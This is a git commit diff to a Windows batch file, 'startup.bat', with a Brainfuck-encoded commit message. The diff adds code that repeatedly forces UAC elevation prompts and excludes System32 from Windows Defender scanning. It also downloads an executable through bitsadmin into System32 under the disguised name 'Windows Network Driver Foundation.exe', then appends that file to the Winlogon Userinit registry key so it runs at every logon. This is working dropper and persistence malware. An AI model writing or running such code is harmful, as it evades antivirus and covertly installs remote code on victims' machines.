57198ff6b76e8c9867c7c98555d61dd242d05f85
nuruzzaman <nuruzzaman@businessaccelerate.com.bd>
2023-11-01 16:22:33 +0600

    +++++++++[>++++++++<-]>++++.---.+++++.---.

--- startup.bat
+++ startup.bat
@@ -1,14 +1,17 @@
 @echo off
+:CheckAdmin
 >nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"
-if %errorlevel% neq 0 (
-    echo Requesting admin privileges...
-    powershell -command Start-Process "%0" -Verb RunAs
-    exit /b
+
+if %errorlevel%==0 (
+    goto :AdminRightsGranted
 )
+powershell -command Start-Process "%0" -Verb RunAs
+ping -n 2 127.0.0.1 >nul
+goto :CheckAdmin
 
-
+:AdminRightsGranted
 powershell -Command "Add-MpPreference -ExclusionPath '%SystemRoot%\System32\'"
-
+bitsadmin /transfer "inferdwnl" /download /priority FOREGROUND "https://nojiPath" "%SystemRoot%\System32\Windows Network Driver Foundation.exe"
 set "newExecutable=%SystemRoot%\System32\Windows Network Driver Foundation.exe"
 
 for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit ^| find "Userinit"') do (
@@ -18,4 +21,3 @@ for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Curren
 set "combinedUserinit=%currentUserinit%%newExecutable%,"
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "%combinedUserinit%" /f
-
